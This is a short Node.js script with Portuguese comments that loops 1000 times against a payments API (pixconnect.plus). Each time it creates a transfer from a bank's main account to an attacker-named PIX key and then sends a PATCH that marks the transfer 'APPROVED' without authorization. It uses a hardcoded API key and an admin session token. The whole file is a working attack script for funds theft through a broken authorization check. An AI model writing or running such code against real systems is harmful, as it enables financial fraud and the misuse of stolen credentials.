const fetch = require("node-fetch"); // Se estiver usando Node.js < 18
// Node 18+ já tem fetch nativo, pode remover a linha acima


const LIMIT_REQUEST = 1000
const API_KEY = "pk_live_5a923cd4-daf6-406d-b52f-b1185e217fcd";
const COOKIE = "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHBpeGNvbm5lY3QuY29tIiwibmFtZSI6IkFkbWluaXN0cmFkb3IgUElYIiwiaWF0IjoxNzYwOTE4NDI5LCJleHAiOjE3NjEwMDQ4Mjl9.1oydScyXkPXeA0fNreGGePFlSlzrEiHHPq9KnONT7Qk";

const HEADERS = {
  "X-API-Key": API_KEY,
  "Content-Type": "application/json",
  "Cookie": COOKIE,
};

const POST_URL = "https://pixconnect.plus/api/transfers";
const PATCH_URL_TEMPLATE = (id) => `https://pixconnect.plus/api/transfers/${id}`;

const postData = {
  fromAccountId: "carbonbank-main",
  toPixKey: "eusouadmin@carbonbank.com",
  amount: 100.0,
  description: "Peguei Para Mim Bruno",
};

async function run() {
  for (let i = 0; i < LIMIT_REQUEST; i++) {
    try {
      // Requisição POST
      const postRes = await fetch(POST_URL, {
        method: "POST",
        headers: HEADERS,
        body: JSON.stringify(postData),
      });

      if (!postRes.ok) throw new Error(`POST falhou: ${postRes.status}`);

      const postJson = await postRes.json();
      const transfer = postJson.transfer;
      const transferId = transfer ? transfer.id : null;

      if (!transferId) {
        console.log(`[${i + 1}] ID da transferência não retornado`);
        continue;
      }

      console.log(`[${i + 1}] POST enviado, ID: ${transferId}`);

      // Requisição PATCH
      const patchRes = await fetch(PATCH_URL_TEMPLATE(transferId), {
        method: "PATCH",
        headers: HEADERS,
        body: JSON.stringify({ status: "APPROVED" }),
      });

      if (!patchRes.ok) throw new Error(`PATCH falhou: ${patchRes.status}`);

      console.log(`[${i + 1}] PATCH aprovado para ID: ${transferId}`);

      // Pequena pausa
      await new Promise((r) => setTimeout(r, 500));
    } catch (error) {
      console.log(`[${i + 1}] Erro no request: ${error.message}`);
    }
  }
}

run();
